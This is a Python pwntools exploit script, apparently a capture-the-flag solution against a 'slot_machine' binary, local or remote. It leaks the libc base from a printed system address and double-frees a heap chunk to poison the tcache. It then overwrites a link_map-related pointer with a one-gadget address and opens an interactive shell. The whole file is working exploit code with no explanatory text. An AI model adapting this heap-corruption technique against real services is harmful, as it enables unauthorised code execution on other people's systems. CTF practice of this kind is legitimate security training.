#!/usr/bin/env python
# encoding: utf-8

__author__  = 'b1gtang'

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

BINARY = './slot_machine'
TARGET = ('127.0.0.1', 2333)

if args.E: # or args.R:
    LIBC64 = './libc.so.6'
else:
    LIBC64 = '/lib/x86_64-linux-gnu/libc.so.6'

if args.R:
    r = remote(TARGET[0], TARGET[1])
else:
    r = process(BINARY, env={'LD_PRELOAD':LIBC64})
    
def attach(addr):
    if addr <= 0x400000:
        addr = addr + 0x555555554000
    gdb.attach(r, gdbscript='b *0x%x' % addr)

def m(size):
    r.sendlineafter('[ 4 ] : bye!\n', '1')
    r.sendlineafter('How much?\n', str(size))

def f(idx):
    r.sendlineafter('[ 4 ] : bye!\n', '2')
    r.sendlineafter('where?\n', str(idx))

def w(data):
    r.sendlineafter('[ 4 ] : bye!\n', '3')
    r.sendafter('what?\n', data)
    
code = ELF(BINARY)
libc = ELF(LIBC64)

r.recvuntil('Here is system : ')
libc.address = int(r.recvuntil('\n')[:-1], 16) - libc.sym['system']
log.info('leak libc address 0x%x' % libc.address)

#attach(0x13ee)
#attach(0x1242)

m(100)
f(0)
f(0)
m(100)
w(p64(libc.address + 0x1c4000)) #link_map
m(100)
m(100)
w(p64(libc.address + 0x45254 - 0x3a570 ))

r.interactive()
